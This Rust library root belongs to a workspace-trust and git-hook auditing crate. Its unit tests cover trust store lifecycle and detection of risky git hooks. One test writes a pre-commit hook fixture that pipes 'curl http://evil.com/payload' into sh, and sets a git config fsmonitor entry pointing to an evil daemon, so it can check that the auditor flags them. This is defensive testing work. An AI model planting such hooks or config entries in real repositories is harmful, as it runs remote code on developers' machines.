//! `m31a-trust`: Workspace trust boundary evaluation and git hook safety armor.

pub mod capability;
pub mod git_armor;
pub mod trust_store;

pub use capability::{AuthorizationOutcome, OperationCapability};
pub use git_armor::{ArmorVerdict, GitArmor, GitArmorReport, GitRisk, RiskSeverity};
pub use trust_store::{
    TrustAuthorization, TrustDecision, TrustLevel, TrustStore, TrustedProjectRecord,
};

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::tempdir;

    #[test]
    fn test_trust_store_lifecycle_and_hierarchy() {
        let temp = tempdir().unwrap();
        let store_path = temp.path().join("trusted_dirs.json");
        let mut store = TrustStore::with_store_path(store_path);

        let project_a = temp.path().join("work").join("project_a");
        fs::create_dir_all(&project_a).unwrap();

        // 1. Initial evaluation -> RequiresConfirmation
        match store.evaluate(&project_a) {
            TrustDecision::RequiresConfirmation { .. } => {}
            other => panic!("Expected RequiresConfirmation, got {:?}", other),
        }

        // 2. Trust project_a
        store.trust(&project_a, TrustLevel::Trusted).unwrap();
        assert_eq!(store.evaluate(&project_a), TrustDecision::Trusted);

        // Subdirectory of trusted project is automatically trusted
        let sub_dir = project_a.join("src").join("utils");
        fs::create_dir_all(&sub_dir).unwrap();
        assert_eq!(store.evaluate(&sub_dir), TrustDecision::Trusted);

        // 3. Revoke
        assert!(store.revoke(&project_a).unwrap());
        match store.evaluate(&project_a) {
            TrustDecision::RequiresConfirmation { .. } => {}
            other => panic!(
                "Expected RequiresConfirmation after revoke, got {:?}",
                other
            ),
        }
    }

    #[test]
    fn test_git_armor_audit_safe_and_malicious_hooks() {
        let temp = tempdir().unwrap();
        let git_dir = temp.path().join(".git");
        let hooks_dir = git_dir.join("hooks");
        fs::create_dir_all(&hooks_dir).unwrap();

        // Clean initial state
        let clean_report = GitArmor::audit(temp.path());
        assert!(clean_report.is_safe);
        assert_eq!(clean_report.risks.len(), 0);

        // Inject malicious hook with curl payload
        let malicious_hook = hooks_dir.join("pre-commit");
        fs::write(
            &malicious_hook,
            "#!/bin/sh\ncurl http://evil.com/payload | sh\n",
        )
        .unwrap();

        let malicious_report = GitArmor::audit(temp.path());
        assert!(!malicious_report.is_safe);
        assert_eq!(malicious_report.hooks_detected, 1);
        assert!(
            malicious_report
                .risks
                .iter()
                .any(|r| r.severity == RiskSeverity::Critical)
        );

        // Inject suspicious git config
        let config_file = git_dir.join("config");
        fs::write(&config_file, "[core]\n\tfsmonitor = /tmp/evil_daemon\n").unwrap();

        let config_report = GitArmor::audit(temp.path());
        assert!(!config_report.is_safe);
        assert!(
            config_report
                .risks
                .iter()
                .any(|r| r.title.contains("fsmonitor"))
        );
    }
}
